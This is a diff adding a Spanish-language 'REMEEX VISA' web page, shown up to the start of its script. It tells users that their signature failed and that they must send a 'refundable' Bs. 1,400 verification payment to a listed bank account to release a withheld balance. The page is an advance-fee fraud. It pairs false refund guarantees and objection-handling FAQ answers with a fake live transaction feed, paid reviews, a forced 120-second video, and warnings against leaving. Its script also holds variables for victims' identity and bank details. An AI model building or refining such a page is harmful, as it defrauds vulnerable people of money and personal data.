+      opacity: 1;
+      transform: translateX(0);
+    }
+    
+    /* Botón de cambiar banco */
+    .change-bank-btn {
+      position: absolute;
+      bottom: 0.5rem;
+      right: 0.5rem;
+      background-color: var(--primary-light);
+      color: white;
+      border: none;
+      border-radius: 20px;
+      padding: 5px 10px;
+      font-size: 0.7rem;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      box-shadow: var(--shadow-sm);
+      z-index: 10;
+    }
+    
+    .change-bank-btn:hover {
+      background-color: var(--primary);
+      transform: translateY(-2px);
+      box-shadow: var(--shadow);
+    }
+    
+    /* Etiqueta para la promoción "Gana 5 USD" */
+    .earn-badge {
+      position: absolute;
+      top: -12px;
+      right: 25px;
+      background-color: #f59e0b;
+      color: white;
+      padding: 3px 10px;
+      border-radius: 20px;
+      font-size: 0.75rem;
+      font-weight: bold;
+      box-shadow: var(--shadow-sm);
+      z-index: 10;
+      animation: pulse 1.5s infinite;
+    }
+
+    /* Botón para foro de usuarios */
+    .forum-button {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      padding: 0.75rem 1.5rem;
+      background: linear-gradient(135deg, #6366f1, #4f46e5);
+      color: white;
+      border-radius: var(--border-radius-sm);
+      font-weight: 600;
+      font-size: 0.95rem;
+      text-decoration: none;
+      transition: var(--transition);
+      box-shadow: var(--shadow);
+      margin: 1.5rem 0;
+      width: 100%;
+      border: none;
+      cursor: pointer;
+    }
+    
+    .forum-button:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 15px 30px rgba(0, 0, 0, 0.3);
+    }
+    
+    .forum-button i {
+      margin-right: 8px;
+    }
+    
+    /* Estilos para bancos logos */
+    .bank-logo-img {
+      height: 20px;
+      max-width: 80px;
+      object-fit: contain;
+      margin-right: 6px;
+    }
+    
+    /* Responsiveness mejorado para dispositivos móviles - manteniendo tarjetas lado a lado */
+    @media (max-width: 768px) {
+      .header {
+        padding: 2rem 1rem;
+      }
+      .header-logo {
+        width: 70%;
+        max-width: 300px;
+      }
+      .progress-bar {
+        margin: 1.5rem 1rem;
+      }
+      .btn-std-container {
+        width: 100%;
+      }
+      .btn-container {
+        width: 100%;
+        justify-content: center;
+      }
+      .dual-cards-container {
+        margin: -1.5rem 1rem 1.5rem 1rem;
+      }
+      .section-content p {
+        font-size: 0.95rem;
+      }
+      .verification-section p,
+      .info-section-old p {
+        font-size: 0.95rem;
+      }
+      .balance-amount {
+        font-size: 1.6rem;
+      }
+      .dynamic-text {
+        font-size: 0.65rem;
+      }
+      .overlay-content {
+        padding: 1.5rem;
+        width: 90%;
+      }
+      .whatsapp-floating-btn {
+        width: 50px;
+        height: 50px;
+        right: 20px;
+        bottom: 20px;
+        font-size: 1.3rem;
+      }
+    }
+    
+    @media (max-width: 600px) {
+      .btn-container {
+        flex-direction: column;
+      }
+      .btn-container .btn-std-container {
+        width: 100%;
+        margin: 0.5rem auto;
+      }
+    }
+    
+    @media (max-width: 480px) {
+      /* Mantenemos las tarjetas lado a lado incluso en dispositivos muy pequeños */
+      .dual-cards-container {
+        margin: -1.5rem 1rem 1.5rem 1rem;
+        gap: 10px;
+      }
+      .card {
+        padding: 1rem;
+        min-height: 140px;
+      }
+      .balance-amount {
+        font-size: 1.4rem;
+      }
+      .logo, .bank-logo {
+        font-size: 1rem;
+      }
+      .section-content h2 {
+        font-size: 1.3rem;
+      }
+      .form-group label,
+      .form-control {
+        font-size: 0.9rem;
+      }
+      .btn-glow {
+        font-size: 0.9rem;
+      }
+      .info-section-old p, .verification-section p {
+        font-size: 0.9rem;
+      }
+    }
+
+    /* Estilos para animación blink */
+    .blink {
+      animation: blink-animation 1s steps(5, start) infinite;
+    }
+    @keyframes blink-animation {
+      to {
+        opacity: 0.5;
+      }
+    }
+
+    /* ESTILOS MODIFICADOS PARA VIDEO OVERLAY */
+    .video-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.9);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      z-index: 2000;
+      backdrop-filter: blur(10px);
+    }
+    
+    .video-container {
+      width: 90%;
+      max-width: 450px; /* Modificado para formato 9:16 */
+      position: relative;
+      border-radius: 10px;
+      overflow: hidden;
+      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
+    }
+    
+    .video-player {
+      width: 100%;
+      aspect-ratio: 9/16; /* Modificado a formato vertical */
+      border: none;
+      display: block;
+    }
+    
+    .video-close-btn {
+      position: absolute;
+      top: 20px;
+      right: 20px;
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+      background-color: var(--primary);
+      color: white;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 18px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      opacity: 0.8;
+      z-index: 2001;
+      /* Inicialmente oculto */
+      display: none; 
+    }
+    
+    .video-close-btn:hover {
+      transform: scale(1.1);
+      opacity: 1;
+    }
+    
+    .video-close-btn.disabled {
+      background-color: var(--text-secondary);
+      cursor: not-allowed;
+    }
+    
+    .video-countdown {
+      margin-top: 20px;
+      color: white;
+      font-size: 1rem;
+      background-color: rgba(26, 31, 113, 0.8);
+      padding: 10px 20px;
+      border-radius: 30px;
+    }
+    
+    .important-notice {
+      margin-top: 20px;
+      color: white;
+      font-size: 1.1rem;
+      background-color: var(--danger);
+      padding: 12px 24px;
+      border-radius: 30px;
+      font-weight: bold;
+      text-align: center;
+      max-width: 90%;
+    }
+    
+    .show-video-btn {
+      display: block;
+      margin: 2rem auto;
+      background-color: var(--primary);
+      color: white;
+      border: none;
+      border-radius: 30px;
+      padding: 12px 20px;
+      font-size: 1rem;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+    }
+    
+    .show-video-btn:hover {
+      background-color: var(--primary-light);
+      transform: translateY(-3px);
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
+    }
+    
+    /* NUEVOS ESTILOS PARA OVERLAY DE CONFIRMACIÓN */
+    .confirmation-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: var(--overlay-bg);
+      backdrop-filter: blur(5px);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 2000;
+      opacity: 0;
+      visibility: hidden;
+      transition: all 0.3s ease;
+    }
+    
+    .confirmation-overlay.active {
+      opacity: 1;
+      visibility: visible;
+    }
+    
+    .confirmation-content {
+      background: white;
+      border-radius: var(--border-radius);
+      padding: 2rem;
+      max-width: 90%;
+      width: 500px;
+      position: relative;
+      box-shadow: var(--shadow-lg);
+      transform: scale(0.9);
+      transition: transform 0.3s ease;
+    }
+    
+    .confirmation-overlay.active .confirmation-content {
+      transform: scale(1);
+    }
+    
+    .confirmation-title {
+      color: var(--primary);
+      font-size: 1.3rem;
+      margin-bottom: 1rem;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    
+    .confirmation-actions {
+      display: flex;
+      gap: 15px;
+      margin-top: 1.5rem;
+    }
+    
+    .confirmation-btn {
+      flex: 1;
+      padding: 10px;
+      border-radius: var(--border-radius-sm);
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      border: none;
+      text-align: center;
+    }
+    
+    .confirmation-btn-primary {
+      background-color: var(--primary);
+      color: white;
+    }
+    
+    .confirmation-btn-primary:hover {
+      background-color: var(--primary-light);
+      transform: translateY(-2px);
+    }
+    
+    .confirmation-btn-secondary {
+      background-color: #e2e8f0;
+      color: var(--text-secondary);
+    }
+    
+    .confirmation-btn-secondary:hover {
+      background-color: #cbd5e1;
+      transform: translateY(-2px);
+    }
+    
+    .confirmation-btn-disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+      pointer-events: none;
+    }
+  </style>
+</head>
+
+<body>
+<div class="container">
+  <!-- Encabezado principal -->
+  <div class="header">
+    <img 
+      src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhnBzNdjl6bNp-nIdaiHVENczJhwlJNA7ocsyiOObMmzbu8at0dY5yGcZ9cLxLF39qI6gwNfqBxlkTDC0txVULEwQVwGkeEzN0Jq9MRTRagA48mh18UqTlR4WhsXOLAEZugUyhqJHB19xJgnkpe-S5VOWFgzpKFwctv3XP9XhH41vNTvq0ZS-nik58Qhr-O/s320/remeex.png"
+      alt="REMEEX VISA Logo" 
+      class="header-logo"
+    >
+    <div class="process-state">
+      <div class="process-step completed"></div>
+      <div class="process-step completed"></div>
+      <div class="process-step completed"></div>
+      <div class="process-step active"></div>
+    </div>
+    <div class="process-label">Etapa Final: Confirmación de Cuenta</div>
+  </div>
+
+  <!-- Tarjeta dividida en dos (REMEEX y Banco) - MEJORADA -->
+  <div class="dual-cards-container">
+    <!-- Tarjeta REMEEX -->
+    <div class="card" id="remeexCard">
+      <!-- Encabezado de la tarjeta -->
+      <div class="card-header">
+        <div class="logo">
+          <i class="fa-brands fa-cc-visa"></i>
+          <span>REMEEX</span>
+        </div>
+        <div class="exchange-rate">
+          <span id="exchangeRateText">Tasa: 90.00</span>
+          <i class="fas fa-exchange-alt" style="font-size: 0.8rem;"></i>
+        </div>
+      </div>
+
+      <!-- Sección del saldo -->
+      <div class="balance-section">
+        <div class="balance-label" id="balanceLabel">
+          Saldo disponible
+          <span class="spinner" id="balanceSpinner">
+            <span class="spinner-circle"></span>
+            <span class="spinner-inner"></span>
+          </span>
+        </div>
+        <div class="balance-amount" id="balanceAmount">0,00 Bs.</div>
+      </div>
+
+      <!-- Texto dinámico unificado -->
+      <div class="info-section">
+        <div class="dynamic-text" id="dynamicText">
+          <span>Esperando verificación de cuenta</span>
+          <span class="dot-loader"></span>
+        </div>
+      </div>
+    </div>
+    
+    <!-- Tarjeta Banco (MODIFICADA PARA INCLUIR LOGO DEL BANCO) -->
+    <div class="card" id="bankCard">
+      <!-- Último paso badge -->
+      <div class="ultimo-paso-badge">
+        <i class="fas fa-flag-checkered" style="margin-right: 4px;"></i>
+        Último paso
+      </div>
+      
+      <!-- Encabezado de la tarjeta -->
+      <div class="card-header">
+        <div class="bank-logo">
+          <img id="bankLogoImg" src="" alt="Logo del banco" class="bank-logo-img">
+          <span id="bankName">Banco</span>
+        </div>
+      </div>
+
+      <!-- Sección del saldo -->
+      <div class="balance-section">
+        <div class="balance-label">
+          Pendiente por recibir saldo
+          <span class="spinner" id="bankSpinner">
+            <span class="spinner-circle"></span>
+            <span class="spinner-inner"></span>
+          </span>
+        </div>
+        <div class="balance-amount" style="color: #999;">0,00 Bs.</div>
+        <div class="bank-account-info" id="bankAccountNumber">Cuenta: XXXX-XXXX-XXXX</div>
+      </div>
+
+      <!-- Texto dinámico unificado -->
+      <div class="info-section">
+        <div class="dynamic-text" id="bankDynamicText">
+          <span>Esperando verificación final</span>
+          <span class="dot-loader"></span>
+        </div>
+      </div>
+      
+      <!-- Botón para cambiar de banco -->
+      <a href="#" class="change-bank-btn" id="changeBankBtn">
+        <i class="fas fa-sync-alt"></i> Cambiar banco
+      </a>
+    </div>
+  </div>
+
+  <!-- Barra de progreso con texto -->
+  <div class="progress-bar">
+    <div class="progress-bar-fill" id="progressBarFill"></div>
+    <span class="progress-text" id="progressText">Verificación adicional</span>
+  </div>
+
+  <!-- STEP 4C: Verificación de cuenta (MODIFICADO) -->
+  <div class="section-content active" id="securityVerification3C">
+    <h2><i class="fas fa-exclamation-triangle"></i> Su firma no coincidió. Verifique su cuenta ahora</h2>
+    
+    <!-- Botón para ver video instructivo -->
+    <button id="showVideoBtn" class="show-video-btn">
+      <i class="fas fa-play-circle"></i> Ver video instructivo del proceso
+    </button>
+    
+    <!-- Nueva sección de garantía -->
+    <div class="guarantee-box">
+      <span class="guarantee-badge">100% SEGURO</span>
+      <h3><i class="fas fa-shield-alt"></i> Garantía REMEEX de devolución</h3>
+      <p>El monto de verificación se devolverá automáticamente junto con tu saldo principal <strong>tan pronto confirmes tu titularidad</strong>.</p>
+    </div>
+    
+    <div class="info-section-old">
+      <p>
+        <strong>Atención:</strong> Hemos detectado que la firma proporcionada no coincide con nuestros registros de seguridad. Para proteger sus fondos y garantizar que usted es el titular legítimo de la cuenta, es necesario realizar una verificación adicional.
+      </p>
+      <ol style="color: var(--text-primary); margin: 1rem 0 1.5rem 1.5rem;">
+        <li style="margin-bottom:1rem;">
+          Desde su cuenta en <strong class="nombreBancoRecarga" id="userBankName">Banco</strong>,
+          realice una recarga de verificación por <strong class="blink" id="verificationAmount">Bs. 1.400,00</strong>. 
+          <strong>Este monto se reembolsará inmediatamente</strong> junto con su saldo disponible.
+        </li>
+        <li>
+          En el concepto del pago móvil escriba: 
+          <strong id="conceptoPagoMovil">V-12345678</strong> (su número de identificación).
+        </li>
+      </ol>
+      <div class="highlight-card">
+        <p style="font-weight: 500;">
+          <i class="fas fa-calculator" style="margin-right: 0.5rem;"></i>
+          <strong>Monto total que recibirá:</strong>
+          <br>
+          <span style="display: block; text-align: center; margin-top: 0.5rem; font-size: 1.1rem;">
+            <strong id="montoRetiroBs">0,00 Bs</strong> + 
+            <strong class="blink" id="verificationAmountDisplay">Bs. 1.400,00</strong> = 
+            <strong id="montoDepositoTotal">0,00 Bs</strong>
+          </span>
+        </p>
+      </div>
+    </div>
+    
+    <h3 class="section-subtitle">
+      <i class="fas fa-info-circle"></i> Datos para realizar la verificación
+    </h3>
+    
+    <!-- Botón para mostrar datos bancarios -->
+    <button id="showBankDataBtn" class="show-bank-data-btn">
+      <i class="fas fa-eye"></i> Tocar para ver los datos de verificación
+    </button>
+    
+    <!-- Nuevo checkbox de aceptación -->
+    <div class="acceptance-container">
+      <div class="acceptance-check">
+        <input type="checkbox" id="acceptVerification" class="acceptance-checkbox">
+        <span class="acceptance-text">
+          Entiendo que la recarga de <strong id="acceptanceAmount">Bs. 1.400,00</strong> es únicamente para verificar la titularidad de mi cuenta y será reembolsada inmediatamente junto con mi saldo principal.
+        </span>
+      </div>
+      <div class="acceptance-check">
+        <input type="checkbox" id="acceptTerms" class="acceptance-checkbox">
+        <span class="acceptance-text">
+          Confirmo que soy el titular legítimo de la cuenta bancaria indicada y acepto los <a href="#" style="color: var(--primary);">términos y condiciones</a> de REMEEX VISA.
+        </span>
+      </div>
+    </div>
+    
+    <!-- Feed de actividad en tiempo real (mejorado para scroll vertical) -->
+    <div class="activity-feed" id="activityFeed">
+      <div class="activity-feed-title">
+        Transacciones recientes
+        <span class="live-indicator">
+          <span class="live-dot"></span> EN VIVO
+        </span>
+      </div>
+      <div class="feed-items" id="feedItems">
+        <!-- Los elementos del feed se cargarán dinámicamente -->
+      </div>
+    </div>
+    
+    <!-- NUEVO: Botón para ir al foro de usuarios -->
+    <a href="fororemeex.html" class="forum-button" id="forumButton" target="_blank">
+      <i class="fas fa-users"></i> ¿Quieres interactuar con otros usuarios de REMEEX en línea? Presiona aquí
+    </a>
+    
+    <!-- Botón para ir a foro de Remeex -->
+    <a href="fororemeex.html" class="navigation-button" id="forumButton" target="_blank">
+      <i class="fas fa-comments"></i> Ver más transacciones recientes
+    </a>
+    
+    <!-- Sección de opiniones con desplazamiento horizontal (modificado) -->
+    <div class="testimonials-section">
+      <h3 class="section-subtitle">
+        <i class="fas fa-star"></i> Lo que dicen nuestros clientes
+      </h3>
+      <div class="testimonial-carousel-container">
+        <div class="testimonial-carousel" id="testimonialsCarousel">
+          <!-- Los testimonios se cargarán dinámicamente -->
+        </div>
+      </div>
+      <div class="testimonial-controls" id="testimonialControls">
+        <!-- Los controles se generarán dinámicamente -->
+      </div>
+    </div>
+    
+    <!-- Botón para ir a opiniones con badge de ganancia -->
+    <a href="opiniones.html" class="navigation-button" id="opinionsButton" style="position: relative;" target="_blank">
+      <i class="fas fa-star"></i> Ver más opiniones de clientes
+      <span class="earn-badge">
+        <i class="fas fa-dollar-sign"></i> Gana 5 USD al dejar un comentario
+      </span>
+    </a>
+    
+    <!-- Nueva sección de FAQ mejorada con preguntas adicionales -->
+    <div class="faq-section">
+      <h3 class="section-subtitle">
+        <i class="fas fa-question-circle"></i> Preguntas frecuentes
+      </h3>
+      <div class="faq-item">
+        <div class="faq-question" onclick="toggleFaq(this)">
+          ¿Por qué necesito hacer una recarga de verificación?
+          <i class="fas fa-chevron-down"></i>
+        </div>
+        <div class="faq-answer">
+          <p>La recarga de verificación es un procedimiento estándar de seguridad que utilizamos para confirmar que eres el titular legítimo de la cuenta bancaria. Es similar al proceso que utilizan PayPal, Stripe y otros servicios financieros donde realizan pequeñas transacciones para validar una cuenta.</p>
+          <p>Este proceso protege tus fondos y evita que alguien más pueda intentar acceder a tu dinero. El monto de verificación se devuelve inmediatamente junto con tu saldo principal.</p>
+        </div>
+      </div>
+      
+      <!-- NUEVA PREGUNTA: ¿Se puede descontar de los fondos? -->
+      <div class="faq-item">
+        <div class="faq-question" onclick="toggleFaq(this)">
+          ¿Se puede descontar el monto de verificación de mis fondos?
+          <i class="fas fa-chevron-down"></i>
+        </div>
+        <div class="faq-answer">
+          <p>No, no es posible descontar el monto de verificación de tus fondos. Al no poder verificar tu firma, necesitamos confirmar que realmente tú tienes control sobre la cuenta bancaria y que nadie está utilizando tu identidad sin autorización.</p>
+          <p>Esta es una medida de seguridad esencial para proteger tus fondos. Al realizar la verificación desde tu propia cuenta bancaria, nos aseguramos que eres el verdadero titular con acceso a dicha cuenta.</p>
+        </div>
+      </div>
+      
+      <!-- NUEVA PREGUNTA: ¿Por qué esa cantidad específica? -->
+      <div class="faq-item">
+        <div class="faq-question" onclick="toggleFaq(this)">
+          ¿Por qué esa cantidad específica y no menos?
+          <i class="fas fa-chevron-down"></i>
+        </div>
+        <div class="faq-answer">
+          <p>El monto de verificación se ajusta dependiendo de la cantidad que vas a recibir, siguiendo estándares internacionales de seguridad financiera. En realidad, representa apenas un 2% de la operación total, lo cual es un porcentaje mínimo considerando que es completamente reembolsable.</p>
+          <p>Este monto específico está diseñado para ser lo suficientemente significativo para validar la titularidad de la cuenta, pero no tan elevado como para causar inconvenientes. Recuerda que recibirás el 100% de este monto de vuelta junto con tu saldo principal.</p>
+        </div>
+      </div>
+      
+      <!-- NUEVA PREGUNTA: ¿Hay otras formas de verificar? -->
+      <div class="faq-item">
+        <div class="faq-question" onclick="toggleFaq(this)">
+          ¿Existen otras formas de verificar mi cuenta?
+          <i class="fas fa-chevron-down"></i>
+        </div>
+        <div class="faq-answer">
+          <p>Sí, contamos con dos métodos principales de verificación:</p>
+          <p>1. <strong>Verificación por firma:</strong> Es el método más rápido y no requiere ninguna recarga. Sin embargo, en tu caso, el sistema ha detectado que la firma proporcionada no coincide con nuestros registros de seguridad.</p>
+          <p>2. <strong>Verificación bancaria:</strong> Es el método alternativo cuando la verificación por firma no es exitosa. Consiste en realizar una pequeña recarga desde la misma cuenta donde recibirás los fondos para comprobar que realmente eres el titular.</p>
+        </div>
+      </div>
+      
+      <!-- NUEVA PREGUNTA: ¿Y si no tengo el monto para verificar? -->
+      <div class="faq-item">
+        <div class="faq-question" onclick="toggleFaq(this)">
+          ¿Qué sucede si no tengo el monto para verificar mi cuenta bancaria?
+          <i class="fas fa-chevron-down"></i>
+        </div>
+        <div class="faq-answer">
+          <p>No te preocupes, tus fondos estarán resguardados hasta que puedas demostrar que eres el titular de la cuenta. Sin embargo, es importante tener en cuenta que la tasa de cambio se conservará en caso de devaluación.</p>
+          <p>Esto significa que cuanto más tiempo demores en realizar la verificación, podría afectar la cantidad final que recibirás si hay fluctuaciones significativas en el tipo de cambio. Te recomendamos completar la verificación lo antes posible para asegurar el valor total de tu transferencia.</p>
+        </div>
+      </div>
+      
+      <!-- NUEVA PREGUNTA: ¿Puedo verificar desde otra cuenta? -->
+      <div class="faq-item">
+        <div class="faq-question" onclick="toggleFaq(this)">
+          ¿Puedo realizar la verificación desde otra cuenta bancaria?
+          <i class="fas fa-chevron-down"></i>
+        </div>
+        <div class="faq-answer">
+          <p>No, la verificación debe realizarse obligatoriamente desde la misma cuenta donde recibirás los fondos. Esto es fundamental porque el propósito de la verificación es precisamente confirmar que tú eres el propietario legítimo de esa cuenta específica.</p>
+          <p>Si realizaras la verificación desde una cuenta diferente, no estaríamos cumpliendo con los protocolos de seguridad necesarios para proteger tus fondos, y no podríamos garantizar que la persona que recibirá el dinero sea realmente el titular autorizado.</p>
+        </div>
+      </div>
+      
+      <div class="faq-item">
+        <div class="faq-question" onclick="toggleFaq(this)">
+          ¿Cuánto tiempo tarda en llegar mi dinero después de la verificación?
+          <i class="fas fa-chevron-down"></i>
+        </div>
+        <div class="faq-answer">
+          <p>Una vez completada la verificación, tu dinero se enviará <strong>instantáneamente</strong> a tu cuenta bancaria. La mayoría de nuestros clientes reciben sus fondos en menos de 1 minuto después de la verificación exitosa.</p>
+        </div>
+      </div>
+      
+      <div class="faq-item">
+        <div class="faq-question" onclick="toggleFaq(this)">
+          ¿Realmente me devuelven el monto de verificación?
+          <i class="fas fa-chevron-down"></i>
+        </div>
+        <div class="faq-answer">
+          <p>¡Absolutamente sí! El 100% del monto de verificación se te devuelve junto con tu saldo principal. No cobramos ninguna comisión por este proceso. El monto total que recibirás será tu saldo + el monto de verificación.</p>
+          <p>Por ejemplo, si tu saldo es de 5.000 Bs y la verificación es de 1.400 Bs, recibirás 6.400 Bs en total.</p>
+        </div>
+      </div>
+      
+      <div class="faq-item">
+        <div class="faq-question" onclick="toggleFaq(this)">
+          ¿Es seguro este procedimiento?
+          <i class="fas fa-chevron-down"></i>
+        </div>
+        <div class="faq-answer">
+          <p>Sí, es 100% seguro. REMEEX VISA utiliza protocolos de seguridad bancaria de nivel internacional y encriptación avanzada para proteger todas tus transacciones. Nunca almacenamos tus datos bancarios completos y todo el proceso cumple con las regulaciones financieras internacionales.</p>
+          <p>Miles de clientes realizan esta verificación a diario sin ningún problema, como puedes ver en el feed de actividad en tiempo real.</p>
+        </div>
+      </div>
+    </div>
+    
+    <!-- Callout de éxito -->
+    <div class="success-callout">
+      <i class="fas fa-check-circle"></i>
+      <div class="success-callout-content">
+        <h4>Estás a un paso de recibir tu dinero</h4>
+        <p>Completa la verificación ahora y recibirás el monto total en tu cuenta bancaria inmediatamente.</p>
+      </div>
+    </div>
+    
+    <!-- Botones de acción mejorados -->
+    <div class="btn-container">
+      <div class="btn-std-container">
+        <div class="btn-glow-effect"></div>
+        <a href="#" id="startOverBtn" class="btn-glow btn-warning">
+          <div class="btn-glow-content btn-glow-initial">
+            <i class="fas fa-undo"></i> Volver a empezar
+          </div>
+          <div class="btn-glow-content btn-glow-hover">
+            <i class="fas fa-undo"></i> Volver a empezar
+          </div>
+        </a>
+      </div>
+      
+      <div class="btn-std-container">
+        <div class="btn-glow-effect"></div>
+        <a href="#" id="completedRechargeBtn" class="btn-glow btn-success">
+          <div class="btn-glow-content btn-glow-initial">
+            <i class="fas fa-check-circle"></i> He completado mi recarga
+          </div>
+          <div class="btn-glow-content btn-glow-hover">
+            <i class="fas fa-check-circle"></i> Continuar al último paso
+          </div>
+        </a>
+      </div>
+    </div>
+  </div>
+</div><!-- Fin de container principal -->
+
+<!-- Overlay para mostrar los datos bancarios -->
+<div class="overlay" id="bankDataOverlay">
+  <div class="overlay-content">
+    <button class="overlay-close" id="closeOverlayBtn"><i class="fas fa-times"></i></button>
+    <h3 class="overlay-title">Datos para realizar la verificación</h3>
+    
+    <div class="bank-data-card" id="datosRecargaFijos">
+      <div class="secure-badge"><i class="fas fa-lock"></i> Seguro</div>
+      <p>
+        <span class="data-label">Banco:</span>
+        <span class="data-value">Banco Venezolano de Crédito (0104)</span>
+        <i class="fas fa-copy copy-icon" onclick="copyToClipboard('Banco Venezolano de Crédito (0104)')"></i>
+      </p>
+      <p>
+        <span class="data-label">Número:</span>
+        <span class="data-value" id="verificacionNumero">0412-1000000</span>
+        <i class="fas fa-copy copy-icon" onclick="copyToClipboard('verificacionNumero')"></i>
+      </p>
+      <p>
+        <span class="data-label">RIF:</span>
+        <span class="data-value" id="verificacionRif">J-407502646</span>
+        <i class="fas fa-copy copy-icon" onclick="copyToClipboard('verificacionRif')"></i>
+      </p>
+      <p>
+        <span class="data-label">Monto:</span>
+        <span class="data-value" id="verificacionMonto">1.400,00 Bolívares</span>
+        <i class="fas fa-copy copy-icon" onclick="copyToClipboard('verificacionMonto')"></i>
+      </p>
+      <p style="margin-top:0.8rem;">
+        <span class="data-label">Concepto:</span>
+        <span class="data-value" id="conceptoRecarga">V-12345678</span>
+        <i class="fas fa-copy copy-icon" onclick="copyToClipboard('conceptoRecarga')"></i>
+      </p>
+    </div>
+  </div>
+</div>
+
+<!-- MODIFICADO: Overlay para video instructivo -->
+<div class="video-overlay" id="videoOverlay" style="display: none;">
+  <div class="video-container">
+    <div style="padding:177.78% 0 0 0;position:relative;">
+      <iframe id="videoPlayer" src="https://player.vimeo.com/video/1066588033?badge=0&amp;autopause=0&amp;player_id=0&amp;app_id=58479" frameborder="0" allow="autoplay; fullscreen; picture-in-picture; clipboard-write; encrypted-media" style="position:absolute;top:0;left:0;width:100%;height:100%;" title="Maite te lo explica Remeex Visa"></iframe>
+    </div>
+  </div>
+  <div class="important-notice">
+    <i class="fas fa-exclamation-triangle" style="margin-right: 8px;"></i> INFORMACIÓN IMPORTANTE
+  </div>
+  <div class="video-countdown" id="videoCountdown">Podrá cerrar el video en: <span id="countdownSeconds">120</span> segundos</div>
+  <div class="video-close-btn" id="videoCloseBtn"><i class="fas fa-times"></i></div>
+</div>
+
+<!-- NUEVO: Overlay para confirmación de recarga -->
+<div class="confirmation-overlay" id="rechargeConfirmationOverlay">
+  <div class="confirmation-content">
+    <h3 class="confirmation-title"><i class="fas fa-check-circle"></i> Confirmar recarga</h3>
+    <p>¿Has realizado efectivamente la recarga de verificación de seguridad por <strong id="confirmationAmount">Bs. 1.400,00</strong>?</p>
+    
+    <div class="acceptance-check" style="margin-top: 1.5rem;">
+      <input type="checkbox" id="confirmRechargeCheckbox" class="acceptance-checkbox">
+      <span class="acceptance-text">Sí, he realizado la recarga reembolsable y deseo continuar.</span>
+    </div>
+    
+    <div class="confirmation-actions">
+      <button class="confirmation-btn confirmation-btn-secondary" id="rechargeNoBtn">No, aún no he realizado la recarga</button>
+      <button class="confirmation-btn confirmation-btn-primary confirmation-btn-disabled" id="rechargeYesBtn">Continuar</button>
+    </div>
+  </div>
+</div>
+
+<!-- NUEVO: Overlay para cambio de banco -->
+<div class="confirmation-overlay" id="changeBankConfirmationOverlay">
+  <div class="confirmation-content">
+    <h3 class="confirmation-title"><i class="fas fa-exclamation-triangle"></i> Límite de firmas excedido</h3>
+    <p>Has superado el límite de intentos de firma no exitosos. El sistema requiere verificación adicional para garantizar que eres el titular legítimo de la cuenta y no alguien haciéndose pasar por ti.</p>
+    <p style="margin-top: 0.75rem;">Si decides cambiar de banco o volver a empezar, seguirá siendo necesaria la verificación adicional.</p>
+    
+    <div class="acceptance-check" style="margin-top: 1.5rem;">
+      <input type="checkbox" id="changeBankCheckbox" class="acceptance-checkbox">
+      <span class="acceptance-text">Entiendo que podré perder mis datos si abandono esta página.</span>
+    </div>
+    
+    <div class="confirmation-actions">
+      <button class="confirmation-btn confirmation-btn-primary" id="stayOnPageBtn">Realizar verificación ahora</button>
+      <button class="confirmation-btn confirmation-btn-secondary confirmation-btn-disabled" id="proceedToChangeBtn">Cambiar banco de todas formas</button>
+    </div>
+  </div>
+</div>
+
+<!-- NUEVO: Overlay para advertencia de navegación -->
+<div class="confirmation-overlay" id="navigationWarningOverlay">
+  <div class="confirmation-content">
+    <h3 class="confirmation-title"><i class="fas fa-exclamation-triangle"></i> ¡Atención! Perderás tu información</h3>
+    <p>Si abandonas esta página ahora, perderás toda la información que has proporcionado y tus fondos permanecerán en espera.</p>
+    <p style="margin-top: 0.75rem; color: var(--danger);">¿Estás seguro de que deseas salir?</p>
+    
+    <div class="confirmation-actions">
+      <button class="confirmation-btn confirmation-btn-primary" id="stayOnPageNavBtn">Permanecer en la página</button>
+      <button class="confirmation-btn confirmation-btn-secondary" id="leavePageBtn">Salir de la página</button>
+    </div>
+  </div>
+</div>
+
+<!-- Botón de WhatsApp flotante para ayuda inmediata -->
+<a href="#" class="whatsapp-floating-btn" id="whatsappHelpBtn">
+  <i class="fab fa-whatsapp"></i>
+  <span class="whatsapp-tooltip">¿Necesitas ayuda? Contáctanos</span>
+</a>
+
+<!-- Script principal actualizado con los nuevos cambios -->
+<script src="https://player.vimeo.com/api/player.js"></script>
+<script>
+  /****************************************************
+   * VARIABLES GLOBALES / REFERENCIAS
+   ****************************************************/
+  let saldoDisponible = 0;
+  let nombreCompleto = "";
+  let documentoBeneficiario = "";
+  let fechaNacimiento = "";
+  let bancoUsuario = "";
+  let numeroCuenta = "";
+  let tipoCuenta = "";
+  let telefonoUsuario = "";
+  let logoBancoUsuario = "";
+
+  // Mensajes para la tarjeta
+  const allMessages = [
+    "Esperando verificación de cuenta",
+    "Preparando transferencia",
+    "Verificando seguridad",
+    "Proceso pendiente de verificación",
+    "Listo para transferir al banco",
+    "Espera un momento por favor",
+    "Seguridad activa",
+    "Transferencia en espera",
+    "Esperando confirmación de datos",
+    "Transferencia protegida lista"
+  ];
+  
+  // Mensajes para la tarjeta del banco
+  const bankMessages = [
+    "Esperando verificación final",
+    "Lista para recibir fondos",
+    "Cuenta verificada pendiente",
+    "Esperando confirmación",
+    "Transferencia en proceso",
+    "Esperando depósito",
+    "Conexión segura establecida",
+    "A un paso de recibir tu dinero",
+    "Último paso requerido",
+    "Completando proceso de seguridad"
+  ];
+  
+  let activeUsers = 347; // ejemplo
+
+  // Nombres venezolanos comunes para el feed de actividad
